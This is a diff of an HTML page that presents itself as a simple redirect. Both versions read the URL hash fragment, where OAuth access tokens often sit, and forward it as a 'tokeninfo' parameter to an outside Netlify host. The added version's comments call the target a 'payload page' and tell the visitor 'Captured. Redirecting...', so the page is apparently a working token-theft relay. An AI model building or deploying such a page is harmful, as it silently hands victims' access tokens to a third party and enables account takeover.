@@ -1,15 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>🔁 Redirecting...</title>
-    <script>
-      const hash = window.location.hash.substring(1); // Strip #
-      const query = encodeURIComponent(hash);
-      window.location.href = "https://684ff57e2f2790ada6c42b4c--statuesque-vacherin-9a305b.netlify.app//?tokeninfo=" + query;
-    </script>
-  </head>
-  <body>
-    Redirecting...
-  </body>
+<head>
+  <title>Redirecting with Token</title>
+  <meta charset="UTF-8" />
+  <script>
+    window.onload = function () {
+      const hash = window.location.hash;
+      if (!hash) {
+        document.body.innerText = "❌ No hash fragment found in the URL.";
+        return;
+      }
+
+      // Strip the hash (#) and encode safely
+      const cleanHash = encodeURIComponent(hash.slice(1));
+
+      // Redirect to payload page with tokeninfo
+      const finalUrl = "https://684ff57e2f2790ada6c42b4c--statuesque-vacherin-9a305b.netlify.app/?tokeninfo=" + cleanHash;
+      document.body.innerText = "🔁 Captured. Redirecting...";
+      window.location.href = finalUrl;
+    };
+  </script>
+</head>
+<body>
+  ⏳ Processing...
+</body>
 </html>
